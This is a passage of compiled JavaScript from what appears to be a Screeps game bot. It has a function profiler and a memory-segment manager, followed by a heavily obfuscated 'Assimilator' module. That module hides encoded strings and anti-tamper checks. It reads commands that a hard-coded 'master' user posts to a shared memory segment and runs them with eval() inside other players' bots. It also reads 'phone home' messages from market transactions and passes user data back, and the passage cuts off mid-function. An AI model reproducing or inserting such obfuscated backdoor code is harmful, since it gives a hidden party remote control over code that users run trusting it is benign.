        return originalFunction.apply(this, arguments);
    }

    wrappedFunction.profilerWrapped = true;
    wrappedFunction.toString = () =>
        `// screeps-profiler wrapped function:\n${originalFunction.toString()}`;

    Object.getOwnPropertyNames(originalFunction).forEach(property => {
        if (!commonProperties.includes(property)) {
            wrappedFunction[property] = originalFunction[property];
        }
    });

    return wrappedFunction;
}

function hookUpPrototypes() {
    Profiler.prototypes.forEach(proto => {
        profileObjectFunctions(proto.val, proto.name);
    });
}

function profileObjectFunctions(object, label) {
    if (object.prototype) {
        profileObjectFunctions(object.prototype, label);
    }
    const objectToWrap = object;

    Object.getOwnPropertyNames(objectToWrap).forEach(functionName => {
        const extendedLabel = `${label}.${functionName}`;

        const isBlackListed = functionBlackList.indexOf(functionName) !== -1;
        if (isBlackListed) {
            return;
        }

        const descriptor = Object.getOwnPropertyDescriptor(objectToWrap, functionName);
        if (!descriptor) {
            return;
        }

        const hasAccessor = descriptor.get || descriptor.set;
        if (hasAccessor) {
            const configurable = descriptor.configurable;
            if (!configurable) {
                return;
            }

            const profileDescriptor = {};

            if (descriptor.get) {
                const extendedLabelGet = `${extendedLabel}:get`;
                profileDescriptor.get = profileFunction(descriptor.get, extendedLabelGet);
            }

            if (descriptor.set) {
                const extendedLabelSet = `${extendedLabel}:set`;
                profileDescriptor.set = profileFunction(descriptor.set, extendedLabelSet);
            }

            Object.defineProperty(objectToWrap, functionName, profileDescriptor);
            return;
        }

        const isFunction = typeof descriptor.value === 'function';
        if (!isFunction || !descriptor.writable) {
            return;
        }
        const originalFunction = objectToWrap[functionName];
        objectToWrap[functionName] = profileFunction(originalFunction, extendedLabel);
    });

    return objectToWrap;
}

function profileFunction(fn, functionName) {
    const fnName = functionName || fn.name;
    if (!fnName) {
        console.log('Couldn\'t find a function name for - ', fn);
        console.log('Will not profile this function.');
        return fn;
    }

    return wrapFunction(fnName, fn);
}

const Profiler = {
    printProfile() {
        console.log(Profiler.output());
    },

    emailProfile() {
        Game.notify(Profiler.output(1000));
    },

    callgrind() {
        const elapsedTicks = Game.time - Memory.profiler.enabledTick + 1;
        Memory.profiler.map['(tick)'].calls = elapsedTicks;
        Memory.profiler.map['(tick)'].time = Memory.profiler.totalTime;
        Profiler.checkMapItem('(root)');
        Memory.profiler.map['(root)'].calls = 1;
        Memory.profiler.map['(root)'].time = Memory.profiler.totalTime;
        Profiler.checkMapItem('(tick)', Memory.profiler.map['(root)'].subs);
        Memory.profiler.map['(root)'].subs['(tick)'].calls = elapsedTicks;
        Memory.profiler.map['(root)'].subs['(tick)'].time = Memory.profiler.totalTime;
        let body = `events: ns\nsummary: ${Math.round(Memory.profiler.totalTime * 1000000)}\n`;
        for (const fnName of Object.keys(Memory.profiler.map)) {
            const fn = Memory.profiler.map[fnName];
            let callsBody = '';
            let callsTime = 0;
            for (const callName of Object.keys(fn.subs)) {
                const call = fn.subs[callName];
                const ns = Math.round(call.time * 1000000);
                callsBody += `cfn=${callName}\ncalls=${call.calls} 1\n1 ${ns}\n`;
                callsTime += call.time;
            }
            body += `\nfn=${fnName}\n1 ${Math.round((fn.time - callsTime) * 1000000)}\n${callsBody}`;
        }
        return body;
    },

    output(passedOutputLengthLimit) {
        const outputLengthLimit = passedOutputLengthLimit || 1000;
        if (!Memory.profiler || !Memory.profiler.enabledTick) {
            return 'Profiler not active.';
        }

        const endTick = Math.min(Memory.profiler.disableTick || Game.time, Game.time);
        const startTick = Memory.profiler.enabledTick + 1;
        const elapsedTicks = endTick - startTick;
        const header = 'calls\t\ttime\t\tavg\t\tfunction';
        const footer = [
            `Avg: ${(Memory.profiler.totalTime / elapsedTicks).toFixed(2)}`,
            `Total: ${Memory.profiler.totalTime.toFixed(2)}`,
            `Ticks: ${elapsedTicks}`,
        ].join('\t');

        const lines = [header];
        let currentLength = header.length + 1 + footer.length;
        const allLines = Profiler.lines();
        let done = false;
        while (!done && allLines.length) {
            const line = allLines.shift();
            // each line added adds the line length plus a new line character.
            if (currentLength + line.length + 1 < outputLengthLimit) {
                lines.push(line);
                currentLength += line.length + 1;
            } else {
                done = true;
            }
        }
        lines.push(footer);
        return lines.join('\n');
    },

    lines() {
        const stats = Object.keys(Memory.profiler.map).map(functionName => {
            const functionCalls = Memory.profiler.map[functionName];
            return {
                name: functionName,
                calls: functionCalls.calls,
                totalTime: functionCalls.time,
                averageTime: functionCalls.time / functionCalls.calls,
            };
        }).sort((val1, val2) => {
            return val2.totalTime - val1.totalTime;
        });

        const lines = stats.map(data => {
            return [
                data.calls,
                data.totalTime.toFixed(1),
                data.averageTime.toFixed(3),
                data.name,
            ].join('\t\t');
        });

        return lines;
    },

    prototypes: [
        {name: 'Game', val: commonjsGlobal.Game},
        {name: 'Map', val: commonjsGlobal.Game.map},
        {name: 'Market', val: commonjsGlobal.Game.market},
        {name: 'PathFinder', val: commonjsGlobal.PathFinder},
        {name: 'RawMemory', val: commonjsGlobal.RawMemory},
        {name: 'ConstructionSite', val: commonjsGlobal.ConstructionSite},
        {name: 'Creep', val: commonjsGlobal.Creep},
        {name: 'Flag', val: commonjsGlobal.Flag},
        {name: 'Mineral', val: commonjsGlobal.Mineral},
        {name: 'Nuke', val: commonjsGlobal.Nuke},
        {name: 'OwnedStructure', val: commonjsGlobal.OwnedStructure},
        {name: 'CostMatrix', val: commonjsGlobal.PathFinder.CostMatrix},
        {name: 'Resource', val: commonjsGlobal.Resource},
        {name: 'Room', val: commonjsGlobal.Room},
        {name: 'RoomObject', val: commonjsGlobal.RoomObject},
        {name: 'RoomPosition', val: commonjsGlobal.RoomPosition},
        {name: 'RoomVisual', val: commonjsGlobal.RoomVisual},
        {name: 'Source', val: commonjsGlobal.Source},
        {name: 'Structure', val: commonjsGlobal.Structure},
        {name: 'StructureContainer', val: commonjsGlobal.StructureContainer},
        {name: 'StructureController', val: commonjsGlobal.StructureController},
        {name: 'StructureExtension', val: commonjsGlobal.StructureExtension},
        {name: 'StructureExtractor', val: commonjsGlobal.StructureExtractor},
        {name: 'StructureKeeperLair', val: commonjsGlobal.StructureKeeperLair},
        {name: 'StructureLab', val: commonjsGlobal.StructureLab},
        {name: 'StructureLink', val: commonjsGlobal.StructureLink},
        {name: 'StructureNuker', val: commonjsGlobal.StructureNuker},
        {name: 'StructureObserver', val: commonjsGlobal.StructureObserver},
        {name: 'StructurePowerBank', val: commonjsGlobal.StructurePowerBank},
        {name: 'StructurePowerSpawn', val: commonjsGlobal.StructurePowerSpawn},
        {name: 'StructurePortal', val: commonjsGlobal.StructurePortal},
        {name: 'StructureRampart', val: commonjsGlobal.StructureRampart},
        {name: 'StructureRoad', val: commonjsGlobal.StructureRoad},
        {name: 'StructureSpawn', val: commonjsGlobal.StructureSpawn},
        {name: 'StructureStorage', val: commonjsGlobal.StructureStorage},
        {name: 'StructureTerminal', val: commonjsGlobal.StructureTerminal},
        {name: 'StructureTower', val: commonjsGlobal.StructureTower},
        {name: 'StructureWall', val: commonjsGlobal.StructureWall},
    ],

    checkMapItem(functionName, map = Memory.profiler.map) {
        if (!map[functionName]) {
            // eslint-disable-next-line no-param-reassign
            map[functionName] = {
                time: 0,
                calls: 0,
                subs: {},
            };
        }
    },

    record(functionName, time, parent) {
        this.checkMapItem(functionName);
        Memory.profiler.map[functionName].calls++;
        Memory.profiler.map[functionName].time += time;
        if (parent) {
            this.checkMapItem(parent);
            this.checkMapItem(functionName, Memory.profiler.map[parent].subs);
            Memory.profiler.map[parent].subs[functionName].calls++;
            Memory.profiler.map[parent].subs[functionName].time += time;
        }
    },

    endTick() {
        if (Game.time >= Memory.profiler.enabledTick) {
            const cpuUsed = Game.cpu.getUsed();
            Memory.profiler.totalTime += cpuUsed;
            Profiler.report();
        }
    },

    report() {
        if (Profiler.shouldPrint()) {
            Profiler.printProfile();
        } else if (Profiler.shouldEmail()) {
            Profiler.emailProfile();
        }
    },

    isProfiling() {
        if (!enabled || !Memory.profiler) {
            return false;
        }
        return !Memory.profiler.disableTick || Game.time <= Memory.profiler.disableTick;
    },

    type() {
        return Memory.profiler.type;
    },

    shouldPrint() {
        const streaming = Profiler.type() === 'stream';
        const profiling = Profiler.type() === 'profile';
        const onEndingTick = Memory.profiler.disableTick === Game.time;
        return streaming || (profiling && onEndingTick);
    },

    shouldEmail() {
        return Profiler.type() === 'email' && Memory.profiler.disableTick === Game.time;
    },
};

var screepsProfiler = {
    wrap(callback) {
        if (enabled) {
            setupProfiler();
        }

        if (Profiler.isProfiling()) {
            usedOnStart = Game.cpu.getUsed();

            // Commented lines are part of an on going experiment to keep the profiler
            // performant, and measure certain types of overhead.

            // var callbackStart = Game.cpu.getUsed();
            const returnVal = callback();
            // var callbackEnd = Game.cpu.getUsed();
            Profiler.endTick();
            // var end = Game.cpu.getUsed();

            // var profilerTime = (end - start) - (callbackEnd - callbackStart);
            // var callbackTime = callbackEnd - callbackStart;
            // var unaccounted = end - profilerTime - callbackTime;
            // console.log('total-', end, 'profiler-', profilerTime, 'callbacktime-',
            // callbackTime, 'start-', start, 'unaccounted', unaccounted);
            return returnVal;
        }

        return callback();
    },

    enable() {
        enabled = true;
        hookUpPrototypes();
    },

    output: Profiler.output,
    callgrind: Profiler.callgrind,

    registerObject: profileObjectFunctions,
    registerFN: profileFunction,
    registerClass: profileObjectFunctions,
};
var screepsProfiler_1 = screepsProfiler.wrap;
var screepsProfiler_2 = screepsProfiler.enable;
var screepsProfiler_3 = screepsProfiler.output;
var screepsProfiler_4 = screepsProfiler.callgrind;
var screepsProfiler_5 = screepsProfiler.registerObject;
var screepsProfiler_6 = screepsProfiler.registerFN;
var screepsProfiler_7 = screepsProfiler.registerClass;

function profile(target, key, _descriptor) {
    if (!USE_PROFILER) {
        return;
    }
    if (key) {
        // case of method decorator
        screepsProfiler.registerFN(target, key);
        return;
    }
    // case of class decorator
    const ctor = target;
    if (!ctor.prototype) {
        return;
    }
    const className = ctor.name;
    screepsProfiler.registerClass(target, className);
}

const MAX_ACTIVE_SEGMENTS = 10;
const DefaultSegmenterMemory = {
    activeSegments: [],
    activeForeignSegment: undefined,
    publicSegments: [],
};
if (!Memory.segmenter) {
    Memory.segmenter = {};
}
_.defaultsDeep(Memory.segmenter, DefaultSegmenterMemory);
/**
 * The segmenter module controls public and private segment memory access
 */
let Segmenter = class Segmenter {
    static get memory() {
        return Memory.segmenter;
    }
    static requestSegments(...ids) {
        for (const id of ids) {
            if (!this.memory.activeSegments.includes(id)) {
                this.memory.activeSegments.push(id);
                if (this.memory.activeSegments.length > MAX_ACTIVE_SEGMENTS) {
                    const removeSegment = this.memory.activeSegments.shift();
                    console.log(`Maximum active segments reached. Discarding segment ${removeSegment}.`);
                }
            }
        }
    }
    static getSegment(id) {
        if ((this.cache.lastAccessed[id] || 0) > (this.cache.lastModified[id] || 0)) {
            return this.cache.segments[id];
        }
        const str = RawMemory.segments[id];
        let segment;
        try {
            segment = JSON.parse(str);
        }
        catch (e) {
            console.log(`Creating new object for RawMemory.segments[${id}].`);
            segment = {};
            this.cache.segments[id] = segment;
            this.cache.lastModified[id] = Game.time;
        }
        this.cache.segments[id] = segment;
        this.cache.lastAccessed[id] = Game.time;
        return this.cache.segments[id];
    }
    static getSegmentProperty(id, key) {
        const segment = this.getSegment(id);
        return segment[key];
    }
    static setSegment(id, value) {
        this.cache.segments[id] = value;
        this.cache.lastModified[id] = Game.time;
    }
    static setSegmentProperty(id, key, value) {
        const segment = this.getSegment(id);
        segment[key] = value;
        this.cache.lastModified[id] = Game.time;
    }
    static requestForeignSegment(username, id) {
        if (username) {
            this.memory.activeForeignSegment = {
                username: username,
                id: id,
            };
        }
    }
    static markSegmentAsPublic(id) {
        if (!this.memory.publicSegments.includes(id)) {
            this.memory.publicSegments.push(id);
        }
    }
    static getForeignSegment() {
        if (RawMemory.foreignSegment) {
            let segment;
            try {
                segment = JSON.parse(RawMemory.foreignSegment.data);
                return segment;
            }
            catch (e) {
                console.log(`Could not parse RawMemory.foreignSegment.data!`);
            }
        }
    }
    static getForeignSegmentProperty(key) {
        if (RawMemory.foreignSegment) {
            let segment;
            try {
                segment = JSON.parse(RawMemory.foreignSegment.data);
            }
            catch (e) {
                segment = {};
                console.log(`Could not parse RawMemory.foreignSegment.data!`);
            }
            return segment[key];
        }
    }
    static run() {
        // Set active, public, and foreign segments
        RawMemory.setActiveSegments(this.memory.activeSegments);
        RawMemory.setPublicSegments(this.memory.publicSegments);
        if (this.memory.activeForeignSegment) {
            RawMemory.setActiveForeignSegment(this.memory.activeForeignSegment.username, this.memory.activeForeignSegment.id);
        }
        else {
            RawMemory.setActiveForeignSegment(null);
        }
        // Write things that have been modified this tick to memory
        for (const id in this.cache.lastModified) {
            if (this.cache.lastModified[id] == Game.time) {
                RawMemory.segments[id] = JSON.stringify(this.cache.segments[id]);
            }
        }
    }
};
Segmenter.cache = {
    segments: {},
    lastAccessed: {},
    lastModified: {},
};
Segmenter = __decorate([
    profile
], Segmenter);

var _0x7048=['UEhOSE06','bG9n','PGZvbnQgY29sb3I9J3llbGxvdyc+','QUxFUlQgIA==','IDwvZm9udD48Zm9udCBjb2xvcj0nZ3JheSc+','dGltZQ==','dG9TdHJpbmc=','PC9mb250Pg==','PGZvbnQgY29sb3I9JyNmZjAwZmYnPg==','IDwvZm9udD4=','YXNzaW1pbGF0b3I=','ZGVmYXVsdHNEZWVw','c2VjcmV0','bWVtb3J5','c2VjcmV0TWVtb3J5','dmFsaWRhdGU=','cHJvdG90eXBl','cHVzaA==','Z2VuZXJhdGVTdHJpbmdIYXNo','bWF0Y2g=','Y29uY2F0','am9pbg==','Z2VuZXJhdGVDaGVja3N1bQ==','R2VuZXJhdGluZyBjaGVja3N1bSBmb3IgQGFzc2ltaWxhdGlvbkxvY2tlZCBvYmplY3RzLi4u','c3RyaW5naWZ5','cmVwbGFjZQ==','cmVkdWNl','U3RyaW5naWZpZWQgY29kZTo=','c2hhMjU2IGhhc2g6','UGFydGlhbCBjaGVja3N1bTog','RmluYWwgY2hlY2tzdW06ICAgICA=','RmluYWwgaGV4IGNoZWNrc3VtOiA=','aXNBc3NpbWlsYXRlZA==','Y2xlYXJhbmNlQ29kZXM=','Z2V0Q2xlYXJhbmNlQ29kZQ==','c3luY2hyb25pemVDbGVhcmFuY2VDb2RlTGVkZ2Vy','Z2V0U2VnbWVudFByb3BlcnR5','Z2V0Rm9yZWlnblNlZ21lbnRQcm9wZXJ0eQ==','bmV3Q2xlYXJhbmNlQ29kZUFsZXJ0','Y2VpbA==','TmV3IGNsZWFyYW5jZSBjb2RlIG9idGFpbmVkOiA=','IChleHBpcmF0aW9uOiA=','Y2FuY2VsQ29tbWFuZA==','Y29tbWFuZHM=','cmVnaXN0ZXJDb21tYW5k','cHVzaENvbW1hbmRzX21hc3Rlcg==','Y2xvbmVEZWVw','c2V0U2VnbWVudFByb3BlcnR5','ZXhlY3V0ZUNvbW1hbmRzX3NsYXZl','dXBkYXRlVmFsaWRDaGVja3N1bUxlZGdlcg==','dXBkYXRlVmFsaWRDaGVja3N1bXNfbWFzdGVy','dmFsaWRDaGVja3N1bXM=','dXBkYXRlVXNlckNoZWNrc3Vtc19tYXN0ZXI=','bWFya2V0','aW5jb21pbmdUcmFuc2FjdGlvbnM=','ZGVzY3JpcHRpb24=','aW5jbHVkZXM=','cGFyc2U=','bGFzdA==','c3BsaXQ=','dXNlcnM=','VW5hYmxlIHRvIHBhcnNlIHBob25lIGhvbWUgbWVzc2FnZSA=','LiBFcnJvcjog','Z2VuZXJhdGVDbGVhcmFuY2VDb2RlX21hc3Rlcg==','dXBkYXRlQ2xlYXJhbmNlQ29kZUxlZGdlcl9tYXN0ZXI=','Y2hlY2tzdW0=','dHJhbnNtaXRVc2VyRGF0YV9zbGF2ZQ==','Z2V0Rm9yZWlnblNlZ21lbnQ=','Zmlyc3Q=','c2FtcGxl','Y29sb25pZXM=','dGVybWluYWxOZXR3b3Jr','cmVhZHlUZXJtaW5hbHM=','c2VuZA==','cnVuX21hc3Rlcg==','cmVxdWVzdFNlZ21lbnRz','bWFw','YWxsVGVybWluYWxz','cm9vbQ==','bmFtZQ==','bWFya1NlZ21lbnRBc1B1YmxpYw==','cnVuX3NsYXZl','cmVxdWVzdEZvcmVpZ25TZWdtZW50','cnVu','TXVvbg==','U2Fycmljaw==','S29reA=='];(function(_0xafa6e7,_0x326562){var _0x2ad43a=function(_0x1f6403){while(--_0x1f6403){_0xafa6e7['push'](_0xafa6e7['shift']());}};var _0x87b469=function(){var _0x116869={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x44621c,_0x2b0156,_0x103c23,_0x4883c2){_0x4883c2=_0x4883c2||{};var _0x304083=_0x2b0156+'='+_0x103c23;var _0x2c14fb=0x0;for(var _0x2c14fb=0x0,_0x31494b=_0x44621c['length'];_0x2c14fb<_0x31494b;_0x2c14fb++){var _0x151f68=_0x44621c[_0x2c14fb];_0x304083+=';\x20'+_0x151f68;var _0x58c6c6=_0x44621c[_0x151f68];_0x44621c['push'](_0x58c6c6);_0x31494b=_0x44621c['length'];if(_0x58c6c6!==!![]){_0x304083+='='+_0x58c6c6;}}_0x4883c2['cookie']=_0x304083;},'removeCookie':function(){return 'dev';},'getCookie':function(_0x8f4059,_0x178e08){_0x8f4059=_0x8f4059||function(_0x5ac467){return _0x5ac467;};var _0x26ab58=_0x8f4059(new RegExp('(?:^|;\x20)'+_0x178e08['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3d3000=function(_0x10693d,_0x3c30e0){_0x10693d(++_0x3c30e0);};_0x3d3000(_0x2ad43a,_0x326562);return _0x26ab58?decodeURIComponent(_0x26ab58[0x1]):undefined;}};var _0xfa8abb=function(){var _0x2e65d8=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x2e65d8['test'](_0x116869['removeCookie']['toString']());};_0x116869['updateCookie']=_0xfa8abb;var _0x452b79='';var _0x27a448=_0x116869['updateCookie']();if(!_0x27a448){_0x116869['setCookie'](['*'],'counter',0x1);}else if(_0x27a448){_0x452b79=_0x116869['getCookie'](null,'counter');}else{_0x116869['removeCookie']();}};_0x87b469();}(_0x7048,0x159));var _0xe5ec=function(_0x2e8422,_0x37eac6){_0x2e8422=_0x2e8422-0x0;var _0x43d248=_0x7048[_0x2e8422];if(_0xe5ec['FiGnzc']===undefined){(function(){var _0x368730=function(){var _0x5be3c5;try{_0x5be3c5=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2ba484){_0x5be3c5=window;}return _0x5be3c5;};var _0x34afba=_0x368730();var _0xa9671='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x34afba['atob']||(_0x34afba['atob']=function(_0x4767b8){var _0x1b9e98=String(_0x4767b8)['replace'](/=+$/,'');for(var _0x3cc0c3=0x0,_0x19ee2d,_0x2564ae,_0x426d39=0x0,_0x31ac58='';_0x2564ae=_0x1b9e98['charAt'](_0x426d39++);~_0x2564ae&&(_0x19ee2d=_0x3cc0c3%0x4?_0x19ee2d*0x40+_0x2564ae:_0x2564ae,_0x3cc0c3++%0x4)?_0x31ac58+=String['fromCharCode'](0xff&_0x19ee2d>>(-0x2*_0x3cc0c3&0x6)):0x0){_0x2564ae=_0xa9671['indexOf'](_0x2564ae);}return _0x31ac58;});}());_0xe5ec['GAggqk']=function(_0x2fdbee){var _0x275907=atob(_0x2fdbee);var _0x4edcdb=[];for(var _0x31ead9=0x0,_0x31bf7b=_0x275907['length'];_0x31ead9<_0x31bf7b;_0x31ead9++){_0x4edcdb+='%'+('00'+_0x275907['charCodeAt'](_0x31ead9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4edcdb);};_0xe5ec['wiqeXd']={};_0xe5ec['FiGnzc']=!![];}var _0x526d81=_0xe5ec['wiqeXd'][_0x2e8422];if(_0x526d81===undefined){var _0x4abd79=function(_0x5dde2b){this['suUCyK']=_0x5dde2b;this['sZBxMi']=[0x1,0x0,0x0];this['BIswQy']=function(){return 'newState';};this['kxzqIp']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['QqCgLh']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4abd79['prototype']['LWNqbR']=function(){var _0x4f89de=new RegExp(this['kxzqIp']+this['QqCgLh']);var _0x537740=_0x4f89de['test'](this['BIswQy']['toString']())?--this['sZBxMi'][0x1]:--this['sZBxMi'][0x0];return this['qdteFW'](_0x537740);};_0x4abd79['prototype']['qdteFW']=function(_0x11964f){if(!Boolean(~_0x11964f)){return _0x11964f;}return this['naYVGX'](this['suUCyK']);};_0x4abd79['prototype']['naYVGX']=function(_0x39b20c){for(var _0x16d958=0x0,_0xf6944c=this['sZBxMi']['length'];_0x16d958<_0xf6944c;_0x16d958++){this['sZBxMi']['push'](Math['round'](Math['random']()));_0xf6944c=this['sZBxMi']['length'];}return _0x39b20c(this['sZBxMi'][0x0]);};new _0x4abd79(_0xe5ec)['LWNqbR']();_0x43d248=_0xe5ec['GAggqk'](_0x43d248);_0xe5ec['wiqeXd'][_0x2e8422]=_0x43d248;}else{_0x43d248=_0x526d81;}return _0x43d248;};var _0x13cde0=function(){var _0x52befb=!![];return function(_0x3ec34f,_0x5bd75a){var _0x3c766b=_0x52befb?function(){if(_0x5bd75a){var _0x33bf27=_0x5bd75a['apply'](_0x3ec34f,arguments);_0x5bd75a=null;return _0x33bf27;}}:function(){};_0x52befb=![];return _0x3c766b;};}();var _0xddb203=_0x13cde0(undefined,function(){var _0x214bed=function(){return '\x64\x65\x76';},_0x52c9ba=function(){return '\x77\x69\x6e\x64\x6f\x77';};var _0x2de487=function(){var _0x49aeb8=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return !_0x49aeb8['\x74\x65\x73\x74'](_0x214bed['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x290224=function(){var _0xf009b9=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0xf009b9['\x74\x65\x73\x74'](_0x52c9ba['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x431fc4=function(_0x1e685e){var _0x524179=~-0x1>>0x1+0xff%0x0;if(_0x1e685e['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x524179)){_0x1b52c8(_0x1e685e);}};var _0x1b52c8=function(_0x14a9a9){var _0xaa3eb2=~-0x4>>0x1+0xff%0x0;if(_0x14a9a9['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xaa3eb2){_0x431fc4(_0x14a9a9);}};if(!_0x2de487()){if(!_0x290224()){_0x431fc4('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x431fc4('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x431fc4('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0xddb203();// javascript-obfuscator:disable
                                      /* tslint:disable:no-eval variable-name class-name */const __lockedObjects__=[];const _0x5ce6efd=[];const MUON$1=_0xe5ec('0x0');const defaultAssimilatorMemory={'masterLedger':{},'clearanceCodes':{}};const defaultSecretAssimilatorMemory={'commands':{},'users':{},'validChecksums':{}};const TRUSTED_USERS=[MUON$1,_0xe5ec('0x1')];const UNTRUSTED_USERS=[_0xe5ec('0x2')];const ASSIMILATOR_SEGMENT=0x62;const ASSIMILATE_FREQUENCY=0x3e8;const T=ASSIMILATE_FREQUENCY;const CHECKSUM_MAX_AGE=0xf4240;const PHONE_HOME_HEADER=_0xe5ec('0x3');function alert(_0x3c75b7){console[_0xe5ec('0x4')](_0xe5ec('0x5')+_0xe5ec('0x6')+_0xe5ec('0x7')+Game[_0xe5ec('0x8')][_0xe5ec('0x9')]()+_0xe5ec('0xa'),_0xe5ec('0xb')+_0x3c75b7+_0xe5ec('0xc'));}class _Assimilator{constructor(){if(!Memory[_0xe5ec('0xd')]){Memory[_0xe5ec('0xd')]={};}_[_0xe5ec('0xe')](Memory[_0xe5ec('0xd')],defaultAssimilatorMemory);if(MY_USERNAME==MUON$1){if(!Memory[_0xe5ec('0xd')][_0xe5ec('0xf')]){Memory[_0xe5ec('0xd')][_0xe5ec('0xf')]={};}_[_0xe5ec('0xe')](Memory[_0xe5ec('0xd')][_0xe5ec('0xf')],defaultSecretAssimilatorMemory);}}get[_0xe5ec('0x10')](){return Memory[_0xe5ec('0xd')];}get[_0xe5ec('0x11')](){return Memory[_0xe5ec('0xd')][_0xe5ec('0xf')];}[_0xe5ec('0x12')](_0x3c8db6){if(_0x3c8db6[_0xe5ec('0x13')][_0xe5ec('0x9')]===Object[_0xe5ec('0x13')][_0xe5ec('0x9')]){__lockedObjects__[_0xe5ec('0x14')](_0x3c8db6);_0x5ce6efd[_0xe5ec('0x14')](_0x3c8db6);}}[_0xe5ec('0x15')](_0x17c456,_0x377fca=![]){let _0x29511c=[];const _0x47f4b2=_0x17c456[_0xe5ec('0x16')](/(\.[a-zA-Z]*\()/gm)||[];const _0x3d6ff4=_0x17c456[_0xe5ec('0x16')](/new [a-zA-Z]*\(/gm)||[];_0x29511c=_0x29511c[_0xe5ec('0x17')](_0x47f4b2,_0x3d6ff4);const _0x15a0de=_0x29511c[_0xe5ec('0x18')]('$');if(_0x377fca)console[_0xe5ec('0x4')](_0x15a0de);return _0x15a0de;}[_0xe5ec('0x19')](_0xb4d0cd=![]){let _0x43cab5=0x0;if(_0xb4d0cd)console[_0xe5ec('0x4')](_0xe5ec('0x1a'));for(const _0xc0c0ca of _0x5ce6efd){const _0x6199d8=/\/\*[\s\S]*?\*\/|([^\\:]|^)\/\/.*$/gm;let _0x52e481=JSON[_0xe5ec('0x1b')](''+_0xc0c0ca);_0x52e481=_0x52e481[_0xe5ec('0x1c')](_0x6199d8,'');_0x52e481=_0x52e481[_0xe5ec('0x1c')](/\s/gm,'');const _0xcca11d=sha256(_0x52e481);_0x43cab5+=_0xcca11d[_0xe5ec('0x1d')]((_0x5dbbbb,_0x5773ea)=>0x2*_0x5dbbbb+_0x5773ea);if(_0xb4d0cd){console[_0xe5ec('0x4')](_0xe5ec('0x1e'));console[_0xe5ec('0x4')](_0x52e481);console[_0xe5ec('0x4')](_0xe5ec('0x1f'));console[_0xe5ec('0x4')](_0xcca11d);console[_0xe5ec('0x4')](_0xe5ec('0x20')+_0x43cab5);}}const _0x2ab6ae='0x'+_0x43cab5[_0xe5ec('0x9')](0x10);if(_0xb4d0cd){console[_0xe5ec('0x4')](_0xe5ec('0x21')+_0x43cab5);console[_0xe5ec('0x4')](_0xe5ec('0x22')+_0x2ab6ae);}return _0x2ab6ae;}[_0xe5ec('0x23')](_0x484604){if(!(this[_0xe5ec('0x10')][_0xe5ec('0x24')]&&this[_0xe5ec('0x10')][_0xe5ec('0x24')][MUON$1])){return ![];}return !!this[_0xe5ec('0x10')][_0xe5ec('0x24')][_0x484604];}[_0xe5ec('0x25')](_0x14721f){return this[_0xe5ec('0x10')][_0xe5ec('0x24')][_0x14721f]||null;}[_0xe5ec('0x26')](){let _0x412226;if(MY_USERNAME==MUON$1){_0x412226=Segmenter[_0xe5ec('0x27')](ASSIMILATOR_SEGMENT,_0xe5ec('0x24'));}else{_0x412226=Segmenter[_0xe5ec('0x28')](_0xe5ec('0x24'))||{};}this[_0xe5ec('0x10')][_0xe5ec('0x24')]=_0x412226;}[_0xe5ec('0x29')](){const _0x598582=ASSIMILATE_FREQUENCY*Math[_0xe5ec('0x2a')](Game[_0xe5ec('0x8')]/ASSIMILATE_FREQUENCY)-0x1;alert(_0xe5ec('0x2b')+this[_0xe5ec('0x25')](MY_USERNAME)+_0xe5ec('0x2c')+_0x598582+')');}[_0xe5ec('0x2d')](_0x28623b){delete this[_0xe5ec('0x11')][_0xe5ec('0x2e')][_0x28623b];}[_0xe5ec('0x2f')](_0x1f53d1,_0x2f227f){this[_0xe5ec('0x11')][_0xe5ec('0x2e')][_0x1f53d1]=_0x2f227f;}[_0xe5ec('0x30')](){const _0x21e292=_[_0xe5ec('0x31')](this[_0xe5ec('0x11')][_0xe5ec('0x2e')]);Segmenter[_0xe5ec('0x32')](ASSIMILATOR_SEGMENT,_0xe5ec('0x2e'),_0x21e292);this[_0xe5ec('0x11')][_0xe5ec('0x2e')]={};}[_0xe5ec('0x33')](){const _0x58d7ce=Segmenter[_0xe5ec('0x28')](_0xe5ec('0x2e'))||{};const _0x7037d0=_0x58d7ce[MY_USERNAME];if(_0x7037d0){eval(_0x7037d0);}}[_0xe5ec('0x34')](){this[_0xe5ec('0x35')]();}[_0xe5ec('0x35')](){const _0x25901d=this[_0xe5ec('0x19')]();this[_0xe5ec('0x11')][_0xe5ec('0x36')][_0x25901d]=Game[_0xe5ec('0x8')];for(const _0x25901d in this[_0xe5ec('0x11')][_0xe5ec('0x36')]){if(this[_0xe5ec('0x11')][_0xe5ec('0x36')][_0x25901d]<Game[_0xe5ec('0x8')]-CHECKSUM_MAX_AGE){delete this[_0xe5ec('0x11')][_0xe5ec('0x36')][_0x25901d];}}}[_0xe5ec('0x37')](){for(const _0x498cc0 of Game[_0xe5ec('0x38')][_0xe5ec('0x39')]){if(_0x498cc0[_0xe5ec('0x8')]==Game[_0xe5ec('0x8')]-0x1&&_0x498cc0[_0xe5ec('0x3a')]&&_0x498cc0[_0xe5ec('0x3a')][_0xe5ec('0x3b')](PHONE_HOME_HEADER)){try{const 